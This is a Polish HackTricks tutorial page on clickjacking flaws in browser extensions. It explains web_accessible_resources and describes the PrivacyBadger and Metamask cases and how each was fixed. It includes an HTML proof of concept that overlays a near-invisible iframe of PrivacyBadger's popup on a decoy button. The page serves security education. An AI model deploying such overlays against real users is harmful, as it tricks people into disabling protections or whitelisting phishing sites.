# BrowExt - ClickJacking

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Ta strona wykorzystuje podatność ClickJacking w rozszerzeniu przeglądarki.\
Jeśli nie wiesz, czym jest ClickJacking, sprawdź:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Rozszerzenia zawierają plik **`manifest.json`**, a ten plik JSON ma pole `web_accessible_resources`. Oto, co [dokumentacja Chrome'a](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) na ten temat mówi:

> Te zasoby będą dostępne na stronie internetowej za pomocą adresu URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, który można wygenerować za pomocą metody **`extension.getURL`**. Zasoby na liście dozwolonych są serwowane z odpowiednimi nagłówkami CORS, dzięki czemu są dostępne za pomocą mechanizmów takich jak XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Zasoby **`web_accessible_resources`** w rozszerzeniu przeglądarki nie są dostępne tylko przez sieć; działają również z przywilejami inherentnymi dla rozszerzenia. Oznacza to, że mają zdolność do:

- Zmiany stanu rozszerzenia
- Ładowania dodatkowych zasobów
- Interakcji z przeglądarką w pewnym stopniu

Jednak ta funkcja niesie ze sobą ryzyko bezpieczeństwa. Jeśli zasób znajdujący się w **`web_accessible_resources`** ma jakąkolwiek istotną funkcjonalność, atakujący może potencjalnie osadzić ten zasób w zewnętrznej stronie internetowej. Nieświadomi użytkownicy odwiedzający tę stronę mogą niechcący aktywować ten osadzony zasób. Takie aktywacje mogą prowadzić do niezamierzonych konsekwencji, w zależności od uprawnień i możliwości zasobów rozszerzenia.

## Przykład PrivacyBadger

W rozszerzeniu PrivacyBadger zidentyfikowano podatność związana z deklaracją katalogu `skin/` jako `web_accessible_resources` w następujący sposób (sprawdź oryginalny [post na blogu](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ta konfiguracja doprowadziła do potencjalnego problemu zabezpieczeń. Konkretnie plik `skin/popup.html`, który jest renderowany po interakcji z ikoną PrivacyBadger w przeglądarce, mógł być osadzony wewnątrz elementu `iframe`. To osadzenie mogło zostać wykorzystane do wprowadzenia użytkowników w błąd i nieświadomego kliknięcia na "Wyłącz PrivacyBadger dla tej witryny". Takie działanie naruszałoby prywatność użytkownika poprzez wyłączenie ochrony PrivacyBadger i potencjalnie narażenie użytkownika na zwiększone śledzenie. Wizualna demonstracja tego ataku może być obejrzana w przykładzie wideo ClickJacking dostępnym pod adresem [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Aby rozwiązać tę podatność, zastosowano prosty sposób: usunięcie `/skin/*` z listy `web_accessible_resources`. Ta zmiana skutecznie ograniczyła ryzyko, zapewniając, że zawartość katalogu `skin/` nie może być dostępna ani manipulowana za pomocą zasobów dostępnych przez sieć.

Naprawa była prosta: **usuń `/skin/*` z `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Przykład Metamask

[**Artykuł na blogu o podatności ClickJacking w Metamask można znaleźć tutaj**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). W tym przypadku Metamask naprawił podatność, sprawdzając, czy protokół używany do dostępu do niego to **`https:`** lub **`http:`** (a nie na przykład **`chrome:`**):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Inna naprawiona podatność ClickJacking** w rozszerzeniu Metamask polegała na tym, że użytkownicy mogli **kliknąć, aby dodać do białej listy**, gdy strona była podejrzana o phishing z powodu `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Ponieważ ta strona była podatna na Clickjacking, atakujący mógł ją wykorzystać, pokazując coś normalnego, aby zmusić ofiarę do kliknięcia, aby dodać ją do białej listy, nie zauważając, że następnie wraca do strony phishingowej, która zostanie dodana do białej listy.

## Przykład Steam Inventory Helper

Sprawdź następującą stronę, aby zobaczyć, jak **XSS** w rozszerzeniu przeglądarki zostało połączone z podatnością **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Odwołania

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
